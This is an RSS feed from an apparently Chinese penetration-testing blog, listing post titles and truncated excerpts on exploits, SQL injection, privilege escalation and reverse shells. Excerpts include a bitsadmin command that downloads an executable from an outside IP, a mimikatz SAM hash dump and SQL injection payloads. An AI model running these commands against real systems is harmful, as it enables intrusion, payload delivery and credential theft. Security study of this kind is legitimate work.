<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Pentest on Reber&#39;s Blog</title>
    <link>https://wyb0.com/categories/Pentest/</link>
    <description>Recent content in Pentest on Reber&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 29 Mar 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://wyb0.com/categories/Pentest/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>固件提取</title>
      <link>https://wyb0.com/posts/2024/extracts-firmware/</link>
      <pubDate>Fri, 29 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2024/extracts-firmware/</guid>
      <description>0x00 固件组成 固件通常由 bootloader、内核、根文件系统及其他资源文件组成 固件采用的根系统文件类型有很多种，常见的有 s</description>
    </item>
    <item>
      <title>硬件接口测试</title>
      <link>https://wyb0.com/posts/2024/hardware-interface-test/</link>
      <pubDate>Wed, 31 Jan 2024 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2024/hardware-interface-test/</guid>
      <description>0x01 JTAG 接口 主要用来读写固件，常见 JTAG 接口引脚有 10PIN、14PIN、20PIN 一般需要接的引脚： GND：接地引脚 TDI：测</description>
    </item>
    <item>
      <title>使用 MSF 进行 PtH 和 PtT</title>
      <link>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</link>
      <pubDate>Sat, 25 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2023/using-msf-for-pth-and-ptt/</guid>
      <description>0x00 概述 环境 攻击机 MSF：172.20.10.2 DC (Server2008R2X64)：10.11.11.5 目标机 (Win7</description>
    </item>
    <item>
      <title>Kerberos 与 NTLM Hash 与 Ticket</title>
      <link>https://wyb0.com/posts/2022/kerberos-hash-ticket/</link>
      <pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2022/kerberos-hash-ticket/</guid>
      <description>0x00 Kerberos Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。 常见的基于 Kerberos 协议攻击的方法如下图所示： 0x01</description>
    </item>
    <item>
      <title>JNDI 注入</title>
      <link>https://wyb0.com/posts/2022/jndi/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2022/jndi/</guid>
      <description>0x00 JDNI JNDI(Java Naming and Directory Interface) 是 Java 提供的 Java 命名和目录接口 JNDI 可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、COR</description>
    </item>
    <item>
      <title>Gophish 钓鱼测试</title>
      <link>https://wyb0.com/posts/2021/gophish/</link>
      <pubDate>Sun, 26 Sep 2021 11:45:33 +0000</pubDate>
      <guid>https://wyb0.com/posts/2021/gophish/</guid>
      <description>0x00 Gophish 使用 配置 Gophish 服务 配置发送邮箱 编写钓鱼邮件内容 编写钓鱼页面 添加目标邮箱 开始攻击 0x01 配置 Gophish 服务 在 https://github.com/gophish/gophish/releases 下载 然后编辑 config.</description>
    </item>
    <item>
      <title>PHP 反序列化与字符串逃逸</title>
      <link>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</link>
      <pubDate>Sun, 18 Jul 2021 17:21:33 +0000</pubDate>
      <guid>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</guid>
      <description>0x00 漏洞成因 该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之</description>
    </item>
    <item>
      <title>Flask 模版注入（SSTI）</title>
      <link>https://wyb0.com/posts/2021/flask-ssti/</link>
      <pubDate>Sun, 11 Jul 2021 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2021/flask-ssti/</guid>
      <description>0x00 SSTI 模版注入 SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap） 一般步骤： 1、某种类型 (字符串</description>
    </item>
    <item>
      <title>PHP 反序列化</title>
      <link>https://wyb0.com/posts/2021/php-deserialize/</link>
      <pubDate>Thu, 08 Jul 2021 17:08:50 +0000</pubDate>
      <guid>https://wyb0.com/posts/2021/php-deserialize/</guid>
      <description>0x01 php 中的魔法函数 __construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先</description>
    </item>
    <item>
      <title>通过 Sphinx 快速查询数据</title>
      <link>https://wyb0.com/posts/2021/sphinx/</link>
      <pubDate>Thu, 10 Jun 2021 16:44:23 +0000</pubDate>
      <guid>https://wyb0.com/posts/2021/sphinx/</guid>
      <description>0x00 Sphinx Sphinx 是一款基于 SQL 的高性能全文检索引擎，Sphinx 的性能在众多全文检索引擎中也是数一数二的，利用 Sphinx我们可以完</description>
    </item>
    <item>
      <title>获取 NTLM Hash</title>
      <link>https://wyb0.com/posts/2020/get-hash/</link>
      <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
      <guid>https://wyb0.com/posts/2020/get-hash/</guid>
      <description>0x01 通过 sam 文件获取 通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限) mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit 通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd</description>
    </item>
    <item>
      <title>记一次 SQLServer 注入</title>
      <link>https://wyb0.com/posts/2020/recording-sqlserver-injection/</link>
      <pubDate>Mon, 22 Jun 2020 17:35:07 +0000</pubDate>
      <guid>https://wyb0.com/posts/2020/recording-sqlserver-injection/</guid>
      <description>0x00 存在 SQL 注入 总之是遇到一个站，登录的页面，数据包大致如下： POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 Content-Length: 47 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://115.xxx.xxx.xxx:8042 Referer:</description>
    </item>
    <item>
      <title>目录遍历利用</title>
      <link>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</link>
      <pubDate>Mon, 16 Dec 2019 09:23:47 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</guid>
      <description>0x00 目录遍历 一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看 一般来说存在目录遍</description>
    </item>
    <item>
      <title>记一次网页 js 挂马</title>
      <link>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</link>
      <pubDate>Mon, 19 Aug 2019 10:17:46 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</guid>
      <description>0x00 常见网页挂马方式 iframe 框架挂马 简单来说就是加 iframe 标签 script 挂马 通过各种办法加载 js 代码 htm 文件挂马 上传 htm 文件，然后用 script 引入 js 挂马 上传</description>
    </item>
    <item>
      <title>FRP 内网穿透</title>
      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
      <pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
      <description>0x00 对外提供简单的文件访问服务 服务端 ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389 ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on</description>
    </item>
    <item>
      <title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title>
      <link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link>
      <pubDate>Sat, 27 Jul 2019 18:15:25 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid>
      <description>0x00 先说前提 昨天某个小伙伴说有个注入没法搞 前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js</description>
    </item>
    <item>
      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</title>
      <link>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</link>
      <pubDate>Sat, 29 Jun 2019 17:57:32 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</guid>
      <description>0x00 影响版本 致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远</description>
    </item>
    <item>
      <title>从 SQL Server 注入到 远程连接桌面</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link>
      <pubDate>Tue, 25 Jun 2019 17:01:53 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid>
      <description>0x00 目标情况 只有一个登录框 0x01 发现注入 简单看了下登陆框，可以爆破用户名 加单引号后报错，试了试 and 1=1 确实存在注入 0x01 进一步测试 尝试</description>
    </item>
    <item>
      <title>从 SQL Server 注入到 getshell</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
      <pubDate>Sat, 02 Mar 2019 20:23:35 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
      <description>0x00 目标情况 一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的</description>
    </item>
    <item>
      <title>SQL注入 tips(Oracle)</title>
      <link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
      <pubDate>Fri, 04 Jan 2019 20:23:35 +0000</pubDate>
      <guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
      <description>0x00 判断数据库类型 Oracle有一些自带的表：dual、user_tables id=45 and (select count(*) from user_tables)&amp;gt;0-- id=45 and (select count(*) from dual)&amp;gt;0-- 利用自带的一些函数：</description>
    </item>
    <item>
      <title>记一次 SQL Server 报错注入</title>
      <link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
      <pubDate>Mon, 24 Dec 2018 10:51:02 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
      <description>0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，</description>
    </item>
    <item>
      <title>内网渗透之 Responder 与 Net-NTLM hash</title>
      <link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link>
      <pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid>
      <description>0x00 一些概念 Windows 认证协议 分为：基于 NTLM 的认证和基于 kerberos 的认证 什么是 NTLM Hash？ 早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性</description>
    </item>
    <item>
      <title>SQL注入 tips(SQL Server)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
      <pubDate>Tue, 04 Sep 2018 10:09:17 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa 0x01 UNION query &amp;amp; error-based 注入 判断存在注入 and 1=1/and 1=2 select * from msg where id=1 and 11=(select case when(1=1) then</description>
    </item>
    <item>
      <title>关于 PHP SESSION 反序列化</title>
      <link>https://wyb0.com/posts/2018/php-session-deserialize/</link>
      <pubDate>Mon, 23 Jul 2018 00:09:17 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/php-session-deserialize/</guid>
      <description>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。 其中有一道是php反序列化，直接用的就是 第三</description>
    </item>
    <item>
      <title>Struts 2 相关漏洞 payload</title>
      <link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
      <pubDate>Mon, 25 Jun 2018 21:26:14 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
      <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表</description>
    </item>
    <item>
      <title>SQL注入 tips(MySQL)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
      <pubDate>Wed, 23 May 2018 11:14:51 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
      <description>环境：MySQL 5.5.47 0x00 注入点在Order by后面 mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &amp;#39;C:\\Apps\\phpStudy\\WWW\\a.txt&amp;#39;; Query OK, 1 row affected (0.01 sec) mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);</description>
    </item>
    <item>
      <title>ThinkPHP5 的 where 函数使用不当存在注入</title>
      <link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link>
      <pubDate>Mon, 16 Apr 2018 19:16:14 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个</description>
    </item>
    <item>
      <title>WebLogic 反序列化漏洞 POC (CVE-2017-10271)</title>
      <link>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</link>
      <pubDate>Fri, 09 Mar 2018 09:20:03 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</guid>
      <description>0x00 WebLogic WLS 组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时</description>
    </item>
    <item>
      <title>Metasploit 简单提权</title>
      <link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
      <pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72</description>
    </item>
    <item>
      <title>Windows 终端下载文件和执行远程文件</title>
      <link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
      <pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate>
      <guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
      <description>环境：Windows Server 2008 R2 Enterprise 0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe 0x01 certutil下载文</description>
    </item>
    <item>
      <title>XXE 漏洞</title>
      <link>https://wyb0.com/posts/2017/xxe/</link>
      <pubDate>Sat, 09 Dec 2017 23:02:22 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/xxe/</guid>
      <description>0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG</description>
    </item>
    <item>
      <title>DNS 域传送漏洞</title>
      <link>https://wyb0.com/posts/2017/dns-zone-transfer/</link>
      <pubDate>Mon, 20 Nov 2017 13:58:33 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/dns-zone-transfer/</guid>
      <description>0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。 若DN</description>
    </item>
    <item>
      <title>SSI 注入</title>
      <link>https://wyb0.com/posts/2017/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/ssi-injection/</guid>
      <description>0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内</description>
    </item>
    <item>
      <title>Struts2-046 EXP</title>
      <link>https://wyb0.com/posts/2017/struts2-046/</link>
      <pubDate>Sun, 16 Apr 2017 17:44:01 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/struts2-046/</guid>
      <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下： #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS,</description>
    </item>
    <item>
      <title>检测 WebLogic 是否存在 SSRF</title>
      <link>https://wyb0.com/posts/2017/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/weblogic-ssrf-check/</guid>
      <description>0x00 weblogic返回状态 weblogic的ssrf漏洞测试3种状态，返回如下： 同网段不存在的主机 同网段主机存活但端口不</description>
    </item>
    <item>
      <title>XSS 中的编码</title>
      <link>https://wyb0.com/posts/2017/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt</description>
    </item>
    <item>
      <title>利用多参数提高 webshell 爆破速度</title>
      <link>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link>
      <pubDate>Fri, 17 Feb 2017 10:32:24 +0000</pubDate>
      <guid>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid>
      <description>0x00 原理 之前在https://www.t00ls.net/viewthread.php?tid=36985看到这个思路的。</description>
    </item>
    <item>
      <title>Python 实现 CDN 的判断</title>
      <link>https://wyb0.com/posts/2016/cdn-detection/</link>
      <pubDate>Fri, 23 Dec 2016 21:10:05 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/cdn-detection/</guid>
      <description>0x00 什么是CDN CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容， 运营商会在全国</description>
    </item>
    <item>
      <title>[转] MySQL 报错注入原理分析(count()、rand()、group by)</title>
      <link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
      <description>原文链接：http://drops.wooyun.org/tips/14312 0x00 疑问 一直在用mysql数据库报错注入方法</description>
    </item>
    <item>
      <title>Nessus 的安装和卸载</title>
      <link>https://wyb0.com/posts/2016/nessus-install-and-remove/</link>
      <pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/nessus-install-and-remove/</guid>
      <description>0x00 下载 Nessus 的 deb 安装包 去【这里】，选择家庭版，然后下载对应的安装包 0x01 本地安装 Nessus 0x02 执行后续安装步骤: 启动nessus web访问</description>
    </item>
    <item>
      <title>脏牛漏洞</title>
      <link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid>
      <description>0x00 测试环境 我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，</description>
    </item>
    <item>
      <title>代码执行漏洞(二)</title>
      <link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link>
      <pubDate>Fri, 14 Oct 2016 13:16:32 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid>
      <description>接着上一篇：代码执行漏洞(一) 0x00 函数create_function() php中的函数create_function()可</description>
    </item>
    <item>
      <title>SqlmapApi 常用方法封装</title>
      <link>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</guid>
      <description>0x00 代码如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import threading import requests import json from time import sleep class Sqli(threading.Thread): &amp;#34;&amp;#34;&amp;#34;docstring for AutoSqli&amp;#34;&amp;#34;&amp;#34; def __init__(self, server, target, data=&amp;#39;&amp;#39;, referer=&amp;#39;&amp;#39;, cookie=&amp;#39;&amp;#39;): threading.Thread.__init__(self) self.server = server[0:-1] if server[-1]==&amp;#39;/&amp;#39; else server self.target = target self.data = data self.referer = referer self.cookie = cookie self.taskid = &amp;#39;&amp;#39; self.data def new_task(self):</description>
    </item>
    <item>
      <title>Python 爆破 zip 压缩包</title>
      <link>https://wyb0.com/posts/2016/python-blasting-zip-archive/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/python-blasting-zip-archive/</guid>
      <description>0x00 代码 多线程爆破加密的zip压缩包 #!/usr/bin/env python # -*- coding: utf-8 -*- import sys import optparse import zipfile import threading import Queue queue = Queue.Queue() lock = threading.Lock() result = &amp;#39;&amp;#39; def load_pwd(filename): for line in open(filename,&amp;#39;r&amp;#39;): if line: queue.put(line.strip()) def bruter(zipname,queue): global result zFile = zipfile.ZipFile(zipname) while</description>
    </item>
    <item>
      <title>POC 框架 Pocsuite</title>
      <link>https://wyb0.com/posts/2016/poc-framework-pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/poc-framework-pocsuite/</guid>
      <description>0x00 关于Pocsuite Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只</description>
    </item>
    <item>
      <title>Python 实现多线程弱口令爆破</title>
      <link>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/</guid>
      <description>0x00 脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- &amp;#39;this script can bruter ftp/ssh/mysql&amp;#39; __author__ = &amp;#39;reber&amp;#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类</description>
    </item>
    <item>
      <title>Metasploit 利用 workspace 进行批量扫描爆破</title>
      <link>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/metasploit-use-workspace-batch-blasting/</guid>
      <description>0x00 启动 0x01 Metasploit的工作平台 在msf里的工作平台可以保存历史的一些操作信息 0x02 使用db_nmap扫描主机 扫描后的</description>
    </item>
    <item>
      <title>Ubuntu 下安装 Metasploit</title>
      <link>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/ubuntu-install-metasploit/</guid>
      <description>0x00 安装Metasploit 下载msfinstall脚本 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall 修改文件权限 $ chmod 755 msfinstall 安装(可能时间较久) $ ./msfinstall 更新exp $</description>
    </item>
    <item>
      <title>BurpSuite 抓手机包</title>
      <link>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/</guid>
      <description>0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包 挂burpsu</description>
    </item>
    <item>
      <title>Web常见漏洞脑图</title>
      <link>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/</guid>
      <description>Web常见漏洞</description>
    </item>
    <item>
      <title>Linux 下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权 Linux下一般都是系统漏洞提权，分为以下几个步骤： 1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反</description>
    </item>
    <item>
      <title>端口转发</title>
      <link>https://wyb0.com/posts/2016/port-forwarding/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/port-forwarding/</guid>
      <description>0x00 应用场景 内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也</description>
    </item>
    <item>
      <title>导出 Windows 主机密码与开启 3389</title>
      <link>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash 关于Windows的hash 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提</description>
    </item>
    <item>
      <title>Windows 下第三方服务提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/windows-use-third-party-server-elevate-privileges/</guid>
      <description>0x00 MSSQL提权 MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权 提权条件：数据库账</description>
    </item>
    <item>
      <title>Windows 下系统漏洞提权</title>
      <link>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>提权是在已经getshell但是权限不大的前提下做的 0x00 查看基本信息 0x01 使用cmd执行命令 尝试使用cmd执行命令 找可写目录 尝</description>
    </item>
    <item>
      <title>反弹 shell 小结</title>
      <link>https://wyb0.com/posts/2016/reverse-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/reverse-shell/</guid>
      <description>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一</description>
    </item>
    <item>
      <title>Dedecms 远程写文件漏洞</title>
      <link>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/dedecms-remote-write-file-vulnerability/</guid>
      <description>0x00 关于漏洞 Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞 0x01 利用条件 de</description>
    </item>
    <item>
      <title>Redis 未授权访问漏洞</title>
      <link>https://wyb0.com/posts/2016/redis-unauthorized-access/</link>
      <pubDate>Thu, 04 Aug 2016 15:52:26 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/redis-unauthorized-access/</guid>
      <description>0x00 Redis的未授权访问 若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。 若Redis以root</description>
    </item>
    <item>
      <title>Tomcat 部署 War 包 getshell</title>
      <link>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于 War 包 War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Ja</description>
    </item>
    <item>
      <title>BurpSuite 的 Intruder 模块</title>
      <link>https://wyb0.com/posts/2016/burpsuite-intruder-module/</link>
      <pubDate>Mon, 01 Aug 2016 09:17:38 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/burpsuite-intruder-module/</guid>
      <description>0x00 示例一 0x01 示例二</description>
    </item>
    <item>
      <title>逻辑漏洞</title>
      <link>https://wyb0.com/posts/2016/logical-loophole/</link>
      <pubDate>Sun, 31 Jul 2016 18:43:49 +0000</pubDate>
      <guid>https://wyb0.com/posts/2016/logical-loophole/</guid>
